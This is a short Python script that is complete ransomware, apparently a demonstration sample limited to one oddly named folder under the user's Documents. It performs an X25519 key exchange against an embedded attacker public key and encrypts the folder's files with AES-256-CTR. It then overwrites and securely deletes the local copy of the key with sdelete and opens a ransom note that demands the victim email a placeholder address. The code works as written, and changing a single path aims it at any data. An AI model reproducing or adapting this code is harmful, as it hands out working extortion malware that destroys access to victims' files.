import subprocess

from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives.ciphers import algorithms, Cipher, modes

from hashlib import sha256
from pathlib import Path
import os
import sys

PUBLIC_KEY = X25519PublicKey.from_public_bytes(bytes.fromhex("18099b8ba29b20553ee1fb36280fce8fcd616d036c70d24fe7918bc199baa879"))

if getattr(sys, "frozen", False):
    WORKING_DIRECTORY = Path(sys.executable).parent
else:
    WORKING_DIRECTORY = Path(__file__).parent

SHARED_KEY_FILE = WORKING_DIRECTORY / "shared_key"
MESSAGE_FILE = WORKING_DIRECTORY / "message.txt"
SDELETE_FILE = WORKING_DIRECTORY / "sdelete64.exe"

ENCRYPT_DIRECTORY = Path.home() / "Documents" / "is_you_happen_to_have_a_directory_named_this_and_they_get_encrypted_then_its_on_you"

MAGIC = b"ENCRYPTED\x00\x00\x00\xde\xad\xbe\xef"


def main():
    if SHARED_KEY_FILE.exists():
        shared_key = SHARED_KEY_FILE.read_bytes()
    else:
        private_key = X25519PrivateKey.generate()
        public_key = private_key.public_key().public_bytes_raw()
        shared_key = sha256(private_key.exchange(PUBLIC_KEY)).digest()

        MESSAGE_FILE.write_text(f"""
        Whoops! Looks your files are encrypted.
        Email fake@example.com quoting the following unique ID to decrypt your files:
        {public_key.hex()}
        """)

        SHARED_KEY_FILE.write_bytes(shared_key)

    if ENCRYPT_DIRECTORY.exists() and ENCRYPT_DIRECTORY.is_dir():
        for file in ENCRYPT_DIRECTORY.iterdir():
            if not file.is_file():
                continue

            contents = file.read_bytes()

            if contents.startswith(MAGIC):
                continue

            nonce = os.urandom(algorithms.AES256.block_size // 8)

            cipher = Cipher(algorithms.AES256(shared_key), modes.CTR(nonce))
            encryptor = cipher.encryptor()

            file.write_bytes(MAGIC + nonce + encryptor.update(contents) + encryptor.finalize())

    SHARED_KEY_FILE.write_bytes(b"A" * SHARED_KEY_FILE.stat().st_size)
    subprocess.call([str(SDELETE_FILE.resolve()), "/accepteula", str(SHARED_KEY_FILE.resolve())])

    subprocess.call(["notepad.exe", MESSAGE_FILE.resolve()])


if __name__ == "__main__":
    main()
